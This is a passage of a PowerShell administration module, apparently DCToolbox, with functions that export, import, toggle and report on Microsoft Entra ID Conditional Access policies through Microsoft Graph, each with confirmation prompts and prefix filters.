            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Export-DCConditionalAccessPolicyDesign

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
            }
            Export-DCConditionalAccessPolicyDesign @Parameters
        
        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                PrefixFilter = 'GLOBAL - '
            }
            Export-DCConditionalAccessPolicyDesign @Parameters
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$FilePath = "$((Get-Location).Path)\Conditional Access Backup $(Get-Date -Format 'yyyy-MM-dd').json",

        [parameter(Mandatory = $false)]
        [string]$PrefixFilter
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Show filter settings.
    if ($PrefixFilter) {
        Write-Verbose -Verbose -Message "Prefix filter was set and only policies beginning with '$PrefixFilter' will be exported!"
    }


    # Export all Conditional Access policies from Microsoft Graph as JSON.
    Write-Verbose -Verbose -Message "Exporting Conditional Access policies to '$FilePath'..."
    
    $ConditionalAccessPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies').value

    $Result = foreach ($Policy in $ConditionalAccessPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Write-Verbose -Verbose -Message "Exporting $($Policy.DisplayName)..."

            $Policy.Id = 'REMOVETHISLINE'

            if ($Policy.GrantControls.authenticationStrength) {
                $params = @{
                    id = [string]$Policy.GrantControls.authenticationStrength.id
                }
    
                $Policy.GrantControls.authenticationStrength = $params
            }
            
            $Policy
        }
    }

    $Result | ConvertTo-Json -Depth 10 | Out-File -Force:$true -FilePath $FilePath


    # Perform some clean up in the JSON file.
    $CleanUp = Get-Content $FilePath | Select-String -Pattern '"REMOVETHISLINE"', '"createdDateTime":', '"modifiedDateTime":', 'authenticationStrength@odata.context' -NotMatch

    $CleanUp | Out-File -Force:$true -FilePath $FilePath


    Write-Verbose -Verbose -Message "Done!"
}



function Import-DCConditionalAccessPolicyDesign {
    <#
        .SYNOPSIS
            Import Conditional Access policies from JSON.

        .DESCRIPTION
            This CMDlet uses Microsoft Graph to automatically create Conditional Access policies from a JSON file.
            
            The JSON file can be created from existing policies with Export-DCConditionalAccessPolicyDesign or manually by following the syntax described in the Microsoft Graph documentation:
            https://docs.microsoft.com/en-us/graph/api/resources/conditionalaccesspolicy?view=graph-rest-1.0

            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use the -SkipReportOnlyMode override.

            WARNING: If you want to, you can also delete all existing policies when deploying your new ones with -DeleteAllExistingPolicies, Use this parameter with caution and always create a backup with Export-DCConditionalAccessPolicyDesign first!

            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).

            As a best practice you should always have an Entra ID security group with break glass accounts excluded from all Conditional Access policies.
            
        .PARAMETER FilePath
            The file path of the JSON file containing your Conditional Access policies.

        .PARAMETER SkipReportOnlyMode
            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use this parameter.

        .PARAMETER DeleteAllExistingPolicies
            WARNING: If you want to, you can delete all existing policies when deploying your new ones with -DeleteAllExistingPolicies, Use this parameter with causon and allways create a backup with Export-DCConditionalAccessPolicyDesign first!!

        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.

        .PARAMETER PrefixFilter
            Only import (and delete) the policies with this prefix in the JSON file.
            
        .INPUTS
            JSON file containing your Conditional Access policies.

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $false
                DeleteAllExistingPolicies = $false
            }

            Import-DCConditionalAccessPolicyDesign @Parameters

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $false
                DeleteAllExistingPolicies = $false
                AddCustomPrefix = 'PILOT - '
            }

            Import-DCConditionalAccessPolicyDesign @Parameters

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $true
                DeleteAllExistingPolicies = $true
                PrefixFilter = 'GLOBAL - '
            }

            Import-DCConditionalAccessPolicyDesign @Parameters
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$FilePath,

        [parameter(Mandatory = $false)]
        [switch]$SkipReportOnlyMode,

        [parameter(Mandatory = $false)]
        [switch]$DeleteAllExistingPolicies,

        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = '',

        [parameter(Mandatory = $false)]
        [string]$PrefixFilter
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Prompt for confirmation:
    if ($SkipReportOnlyMode) {
        $title    = 'Confirm'
        $question = "Do you want to import the Conditional Access policies from JSON file '$FilePath' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES will go live for ALL USERS! Remove -SkipReportOnlyMode to deploy in report-only mode instead."
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to import the Conditional Access policies from JSON file '$FilePath' in report-only mode in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    }


    # Show filter settings.
    if ($PrefixFilter) {
        Write-Verbose -Verbose -Message "Prefix filter was set and only policies beginning with '$PrefixFilter' will be affected!"
    }


    # Import policies from JSON file.
    Write-Verbose -Verbose -Message "Importing JSON from '$FilePath'..."
    $ConditionalAccessPolicies = Get-Content -Raw -Path $FilePath


    # Modify enabled policies to report-only if not skipped with -SkipReportOnlyMode.
    if (!($SkipReportOnlyMode)) {
        Write-Verbose -Verbose -Message "Setting new policies to report-only mode..."
        $ConditionalAccessPolicies = $ConditionalAccessPolicies -replace '"enabled"', '"enabledForReportingButNotEnforced"'
    }


    # Add prefix.
    $ConditionalAccessPolicies = $ConditionalAccessPolicies -replace '"displayName": "', """displayName"": ""$AddCustomPrefix"


    # Delete all existing policies if -DeleteAllExistingPolicies is specified.
    if ($DeleteAllExistingPolicies) {
        Write-Verbose -Verbose -Message "Deleting existing Conditional Access policies..."
        $GraphUri = 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies'
        $ExistingPolicies = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue

        foreach ($Policy in $ExistingPolicies) {
            if ($Policy.displayName.StartsWith($PrefixFilter)) {
                Start-Sleep -Seconds 1
                $GraphUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies/$($Policy.id)"
    
                Invoke-MgGraphRequest -AccessToken $AccessToken -GraphMethod 'DELETE' -GraphUri $GraphUri -ErrorAction SilentlyContinue | Out-Null
            }
        }
    }


    $ConditionalAccessPolicies = $ConditionalAccessPolicies | ConvertFrom-Json

    foreach ($Policy in $ConditionalAccessPolicies) {
        if ($Policy.displayName.StartsWith($PrefixFilter)) {
            Start-Sleep -Seconds 1
            Write-Verbose -Verbose -Message "Creating '$($Policy.DisplayName)'..."

            try {
                # Create new policies.
                Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' -Body ($Policy | ConvertTo-Json -Depth 10) | Out-Null
            }
            catch {
                Write-Error -Message $_.Exception.Message -ErrorAction Continue
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Set-DCConditionalAccessPoliciesPilotMode {
    <#
        .SYNOPSIS
            Toggles Conditional Access policies between 'All users' and a specified pilot group.

        .DESCRIPTION
            This command helps you to quickly toggle you Conditional Access policies between a pilot and production. It does this by switching policies targeting a specified pilot group and 'All users'.

            It is common to use a dedicated Entra ID security group to target specific pilot users during a Conditional Access deployment project. When the pilot is completed you want to move away from that pilot group and target 'All users' in the organization instead (at least with your global baseline).

            You must filter the toggle with a prefix filter to only modify specific policies. Use a prefix like "GLOBAL -" or "PILOT -" for easy bulk management. This is a built-in safety measure.
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix.

        .PARAMETER PilotGroupName
            The name of your pilot group in Entra ID (must be a security group for users).

        .PARAMETER EnablePilot
            Modify all specified Conditional Access policies to target your pilot group.

        .PARAMETER EnableProduction
            Modify all specified Conditional Access policies to target 'All users'.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnablePilot

        .EXAMPLE
            Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnableProduction
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$PrefixFilter,

        [parameter(Mandatory = $true)]
        [string]$PilotGroupName,

        [parameter(Mandatory = $false)]
        [switch]$EnablePilot,

        [parameter(Mandatory = $false)]
        [switch]$EnableProduction
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Parameter check:
    if ($EnablePilot -and $EnableProduction)  {
        Write-Error -Message 'You can''t use -EnablePilot and -EnableProduction at the same time!'
        return
    } elseif (!($EnablePilot) -and !($EnableProduction)) {
        Write-Error -Message 'You must use -EnablePilot or -EnableProduction!'
        return
    }


    if ($EnableProduction) {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from pilot group '$PilotGroupName' to 'All users'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from 'All users' to pilot group '$PilotGroupName'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }


    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing pilot group '$PilotGroupName'..."
    $ExistingPilotGroup = Get-MgGroup -Filter "DisplayName eq '$PilotGroupName'" -Top 1

    if ($ExistingPilotGroup) {
        Write-Verbose -Verbose -Message "Found group '$PilotGroupName'!"
    } else {
        Write-Error -Message "Could not find group '$PilotGroupName'!"
        return
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to toggle..."
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($EnableProduction) {
                if ($Policy.Conditions.Users.IncludeGroups -contains $ExistingPilotGroup.Id) {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to 'All users'..."

                    # Toggle policy:
                    $params = @{
                        Conditions = @{
                            Users = @{
                                IncludeUsers = @(
                                    "All"
                                )
                            }
                        }
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            } elseif ($EnablePilot) {
                if ($Policy.Conditions.Users.IncludeUsers -eq 'All') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to pilot group..."

                    # Toggle policy:
                    $params = @{
                        Conditions = @{
                            Users = @{
                                IncludeUsers = @(
                                    "None"
                                )
                                IncludeGroups = @(
                                    "$($ExistingPilotGroup.Id)"
                                )
                            }
                        }
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Set-DCConditionalAccessPoliciesReportOnlyMode {
    <#
        .SYNOPSIS
            Toggles Conditional Access policies between 'Report-only' and Enabled.

        .DESCRIPTION
            This command helps you to quickly toggle you Conditional Access policies between Report-only and Enabled.

            If will skip any policies in Disabled state.

            You must filter the toggle with a prefix filter to only modify specific policies. This is a built-in safety measure.
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix.

        .PARAMETER SetToReportOnly
            Modify all specified Conditional Access policies to report-only.

        .PARAMETER SetToEnabled
            Modify all specified Conditional Access policies to Enabled.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToReportOnly

        .EXAMPLE
            Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToEnabled
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$PrefixFilter,

        [parameter(Mandatory = $false)]
        [switch]$SetToReportOnly,

        [parameter(Mandatory = $false)]
        [switch]$SetToEnabled
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Parameter check:
    if ($SetToReportOnly -and $SetToEnabled)  {
        Write-Error -Message 'You can''t use -SetToReportOnly and -SetToEnabled at the same time!'
        return
    } elseif (!($SetToReportOnly) -and !($SetToEnabled)) {
        Write-Error -Message 'You must use -SetToReportOnly or -SetToEnabled!'
        return
    }


    if ($SetToEnabled) {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from Report-only to Enabled?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from Enabled to Report-only?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to toggle..."
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($SetToEnabled) {
                if ($Policy.State -eq 'enabledForReportingButNotEnforced') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to Enabled..."

                    # Toggle policy:
                    $params = @{
                        State = "enabled"
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            } elseif ($SetToReportOnly) {
                if ($Policy.State -eq 'Enabled') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to Report-only..."

                    # Toggle policy:
                    $params = @{
                        State = "enabledForReportingButNotEnforced"
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Add-DCConditionalAccessPoliciesBreakGlassGroup {
    <#
        .SYNOPSIS
            Excludes a specified Entra ID security group from all Conditional Access policies in the tenant.

        .DESCRIPTION
            Excludes a specified Entra ID security group from all Conditional Access policies in the tenant.

            Please create the group and add your break glass accounts before running this command.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only modify the policies with this prefix.

        .PARAMETER ExcludeGroupName
            The name of your exclude group in Entra ID. Please create the group and add your break glass accounts before running this command.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Add-DCConditionalAccessPoliciesBreakGlassGroup -PrefixFilter 'GLOBAL - ' -ExcludeGroupName 'Excluded from Conditional Access'
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $true)]
        [string]$ExcludeGroupName
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All', 'Group.Read.All' -Verbose


    # Prompt for confirmation:
    $title    = 'Confirm'
    $question = "Do you want to exclude the group '$($ExcludeGroupName)' from all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
    $choices  = '&Yes', '&No'

    $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
    if ($decision -eq 0) {
        Write-Host ""
    } else {
        return
    }


    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing exclude group '$ExcludeGroupName'..."
    $ExistingExcludeGroup = Get-MgGroup -Filter "DisplayName eq '$ExcludeGroupName'" -Top 1

    if ($ExistingExcludeGroup) {
        Write-Verbose -Verbose -Message "Found group '$ExcludeGroupName'!"
    } else {
        Write-Error -Message "Could not find group '$ExcludeGroupName'!"
        return
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to modify..."
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Write-Verbose -Verbose -Message "Excluding group '$ExcludeGroupName' from '$($Policy.DisplayName)'..."

            # Toggle policy:
            $params = @{
                Conditions = @{
                    Users = @{
                        ExcludeGroups = @(
                            $Policy.Conditions.Users.ExcludeGroups
                            "$($ExistingExcludeGroup.Id)"
                        )
                    }
                }
            }
            
            Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

            Start-Sleep -Seconds 1
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function New-DCConditionalAccessPolicyDesignReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing your current Conditional Access policy design.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Conditional Access policies and exports an Excel report, You can use the report as documentation, design document, or to get a nice overview of all your policies.

            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force

            The report is exported to Excel and will automatically open. In Excel, please do this:
            1. Select all cells.
            2. Click on "Wrap Text".
            3. Click on "Top Align".

            The report is now easier to read.
            
            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).
            
        .INPUTS
            None

        .OUTPUTS
            Excel report with all Conditional Access policies.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            New-DCConditionalAccessPolicyDesignReport
    #>



    # ----- [Initialisations] -----

    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check if the Excel module is installed.
    if (Get-Module -ListAvailable -Name "ImportExcel") {
        # Do nothing.
    } else {
        Write-Error -Exception "The Excel PowerShell module is not installed. Please, run 'Install-Module ImportExcel -Force' as an admin and try again." -ErrorAction Stop
    }


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Application.Read.All', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Export all Conditional Access policies from Microsoft Graph as JSON.
    Write-Verbose -Verbose -Message "Generating Conditional Access policy design report..."
    
    # Fetch conditional access policies.
    Write-Verbose -Verbose -Message "Getting all Conditional Access policies..."
    $CAPolicies = Get-MgIdentityConditionalAccessPolicy

    # Fetch service principals for id translation.
    $EnterpriseApps = Get-MgServicePrincipal

    # Fetch roles for id translation.
    $EntraIDRoles =  Get-MgDirectoryRoleTemplate | Select-Object DisplayName, Description, Id | Sort-Object DisplayName


    # Format the result.
    $Result = foreach ($Policy in $CAPolicies) {
        $CustomObject = New-Object -TypeName psobject


        # displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value (Out-String -InputObject $Policy.displayName)


        # state
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value (Out-String -InputObject $Policy.state)


        # includeUsers
        $Users = foreach ($User in $Policy.conditions.users.includeUsers) {
            if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
                (Get-MgUser -Filter "id eq '$User'").userPrincipalName
            }
            else {
                $User
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsers" -Value (Out-String -InputObject $Users)


        # excludeUsers
        $Users = foreach ($User in $Policy.conditions.users.excludeUsers) {
            if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
                (Get-MgUser -Filter "id eq '$User'").userPrincipalName
            }
            else {
                $User
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsers" -Value (Out-String -InputObject $Users)


        # includeGroups
        $Groups = foreach ($Group in $Policy.conditions.users.includeGroups) {
            if ($Group -ne 'All' -and $Group -ne 'None') {
                (Get-MgGroup -Filter "id eq '$Group'").DisplayName
            }
            else {
                $Group
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroups" -Value (Out-String -InputObject $Groups)


        # excludeGroups
        $Groups = foreach ($Group in $Policy.conditions.users.excludeGroups) {
            if ($Group -ne 'All' -and $Group -ne 'None') {
                (Get-MgGroup -Filter "id eq '$Group'").DisplayName
            }
            else {
                $Group
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroups" -Value (Out-String -InputObject $Groups)


        # includeRoles
        $Roles = foreach ($Role in $Policy.conditions.users.includeRoles) {
            if ($Role -ne 'None' -and $Role -ne 'All') {
                $RoleToCheck = ($EntraIDRoles | Where-Object { $_.Id -eq $Role }).displayName

                if ($RoleToCheck) {
                    $RoleToCheck
                }
                else {
                    $Role
                }
            }
            else {
                $Role
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRoles" -Value (Out-String -InputObject $Roles)


        # excludeRoles
        $Roles = foreach ($Role in $Policy.conditions.users.excludeRoles) {
            if ($Role -ne 'None' -and $Role -ne 'All') {
                $RoleToCheck = ($EntraIDRoles | Where-Object { $_.Id -eq $Role }).displayName

                if ($RoleToCheck) {
                    $RoleToCheck
                }
                else {
                    $Role
                }
            }
            else {
                $Role
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRoles" -Value (Out-String -InputObject $Roles)


        # includeApplications
        $Applications = foreach ($Application in $Policy.conditions.applications.includeApplications) {
            if ($Application -ne 'None' -and $Application -ne 'All' -and $Application -ne 'Office365') {
                ($EnterpriseApps | Where-Object { $_.AppId -eq $Application }).displayName
            }
            else {
                $Application
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeApplications" -Value (Out-String -InputObject $Applications)


        # excludeApplications
        $Applications = foreach ($Application in $Policy.conditions.applications.excludeApplications) {
            if ($Application -ne 'None' -and $Application -ne 'All' -and $Application -ne 'Office365') {
                ($EnterpriseApps | Where-Object { $_.AppId -eq $Application }).displayName
            }
            else {
                $Application
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeApplications" -Value (Out-String -InputObject $Applications)


        # includeUserActions
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUserActions" -Value (Out-String -InputObject $Policy.conditions.applications.includeUserActions)


        # userRiskLevels
        $CustomObject | Add-Member -MemberType NoteProperty -Name "userRiskLevels" -Value (Out-String -InputObject $Policy.conditions.userRiskLevels)


        # signInRiskLevels
        $CustomObject | Add-Member -MemberType NoteProperty -Name "signInRiskLevels" -Value (Out-String -InputObject $Policy.conditions.signInRiskLevels)


        # includePlatforms
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includePlatforms" -Value (Out-String -InputObject $Policy.conditions.platforms.includePlatforms)


        # excludePlatforms
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludePlatforms" -Value (Out-String -InputObject $Policy.conditions.platforms.excludePlatforms)


        # clientAppTypes
        $CustomObject | Add-Member -MemberType NoteProperty -Name "clientAppTypes" -Value (Out-String -InputObject $Policy.conditions.clientAppTypes)


        # includeLocations
        $includeLocations = foreach ($includeLocation in $Policy.conditions.locations.includeLocations) {
            if ($includeLocation -ne 'All' -and $includeLocation -ne 'AllTrusted' -and $includeLocation -ne '00000000-0000-0000-0000-000000000000') {
                (Get-MgIdentityConditionalAccessNamedLocation -Filter "Id eq '$includeLocation'").DisplayName
            }
            elseif ($includeLocation -eq '00000000-0000-0000-0000-000000000000') {
                'MFA Trusted IPs'
            }
            else {
                $includeLocation
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeLocations" -Value (Out-String -InputObject $includeLocations)


        # excludeLocation
        $excludeLocations = foreach ($excludeLocation in $Policy.conditions.locations.excludeLocations) {
            if ($excludeLocation -ne 'All' -and $excludeLocation -ne 'AllTrusted' -and $excludeLocation -ne '00000000-0000-0000-0000-000000000000') {
                (Get-MgIdentityConditionalAccessNamedLocation -Filter "Id eq '$includeLocation'").DisplayName
            }
            elseif ($excludeLocation -eq '00000000-0000-0000-0000-000000000000') {
                'MFA Trusted IPs'
            }
            else {
                $excludeLocation
            }
        }


        # excludeLocations
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeLocations" -Value (Out-String -InputObject $excludeLocations)


        # grantControls
        $CustomObject | Add-Member -MemberType NoteProperty -Name "grantControls" -Value (Out-String -InputObject $Policy.grantControls.builtInControls)


        # termsOfUse
        $TermsOfUses = foreach ($TermsOfUse in $Policy.grantControls.termsOfUse) {
            $GraphUri = "https://graph.microsoft.com/v1.0/agreements/$TermsOfUse"
            (Get-MgAgreement | where Id -eq $TermsOfUse).displayName
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "termsOfUse" -Value (Out-String -InputObject $TermsOfUses)


        # operator
        $CustomObject | Add-Member -MemberType NoteProperty -Name "operator" -Value (Out-String -InputObject $Policy.grantControls.operator)


        # sessionControlsapplicationEnforcedRestrictions
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlsapplicationEnforcedRestrictions" -Value (Out-String -InputObject $Policy.sessionControls.applicationEnforcedRestrictions.isEnabled)


        # sessionControlscloudAppSecurity
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlscloudAppSecurity" -Value (Out-String -InputObject $Policy.sessionControls.cloudAppSecurity.isEnabled)


        # sessionControlssignInFrequency
